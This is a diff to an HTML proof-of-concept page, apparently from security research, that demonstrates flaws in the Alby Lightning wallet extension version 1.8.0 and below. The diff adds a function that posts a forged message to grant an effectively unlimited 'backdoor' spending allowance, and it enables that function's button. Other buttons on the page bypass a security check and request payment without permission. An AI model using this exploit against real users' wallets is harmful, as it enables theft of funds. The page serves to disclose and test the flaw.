@@ -48,6 +48,22 @@
         window.webln.enabled = true;
         await window.webln.sendPayment(await getInvoice(1000));
       }
+
+      async function setupBackdoor() {
+        window.postMessage(
+         {
+            application: "LBE",
+            prompt: true,
+            action: "updateAllowance",
+            type: "enable",
+            args: {
+              totalBudget: 1e+200,
+              enabled: true,
+            },
+          },
+          "*"
+        );
+      }
     </script>
   </head>
   <body>
@@ -65,7 +81,7 @@
       <h3>Alby 1.8.0 and below</h3>
       <button onclick="sendUsingPostMsg180();">Send using window.postMessage() and bypassing security check</button>
       <button onclick="bypassEnableSend();">Ask for payment without calling webLn.enable</button>
-      <!--<button onclick="setupBackdoor();">Place a "backdoor" allowance</button>-->
+      <button onclick="setupBackdoor();">Place a "backdoor" allowance</button>
     </section>
   </main>
   </body>
